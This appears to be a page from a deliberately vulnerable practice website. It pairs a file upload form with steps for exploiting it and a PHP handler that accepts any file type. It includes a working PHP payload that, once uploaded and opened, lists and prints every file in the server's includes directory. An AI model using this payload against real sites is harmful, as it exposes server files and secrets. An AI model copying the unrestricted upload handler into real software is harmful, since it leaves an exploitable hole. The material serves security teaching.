<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Upload</title>
</head>
<body>
    <h2>Upload File</h2>
    <form action="upload.php" method="post" enctype="multipart/form-data">
        Select file to upload:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" value="Upload File" name="submit">
    </form>

    <h3>Testing File Upload Vulnerability</h3>
    <p>To test this file upload vulnerability, follow these steps:</p>
    <ol>
        <li>Create a file named <code>malicious.php</code> with the following content:
            <pre>
&lt;?php
echo "This is a malicious file.&lt;br&gt;";

// Function to list files in a directory
function listFiles($dir) {
    if ($handle = opendir($dir)) {
        echo "Files in directory $dir:&lt;br&gt;";
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                echo "$entry&lt;br&gt;";
            }
        }
        closedir($handle);
    } else {
        echo "Could not open directory $dir.&lt;br&gt;";
    }
}

// Function to read and display file contents
function readFileContents($filepath) {
    if (file_exists($filepath)) {
        echo "Contents of $filepath:&lt;br&gt;";
        echo nl2br(htmlspecialchars(file_get_contents($filepath))) . "&lt;br&gt;&lt;br&gt;";
    } else {
        echo "$filepath file does not exist.&lt;br&gt;";
    }
}

// List and display all files in the includes directory
$includes_dir = '../includes';
listFiles($includes_dir);

$files = scandir($includes_dir);
foreach ($files as $file) {
    if ($file != "." && $file != "..") {
        $filepath = $includes_dir . '/' . $file;
        readFileContents($filepath);
    }
}
?&gt;
            </pre>
        </li>
        <li>Upload the <code>malicious.php</code> file using the form above.</li>
        <li>Once the file is uploaded, you will see a confirmation message.</li>
        <li>Navigate to <code>http://localhost/vulnerable-website/public/uploads/malicious.php</code> to see the execution of the malicious file. This file will list and display the contents of all files in the <code>includes</code> directory.</li>
    </ol>
</body>
</html>

<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $target_dir = "../uploads/";
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;
    $fileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    // Allow all file types (vulnerable)
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ". htmlspecialchars(basename($_FILES["fileToUpload"]["name"])). " has been uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
?>
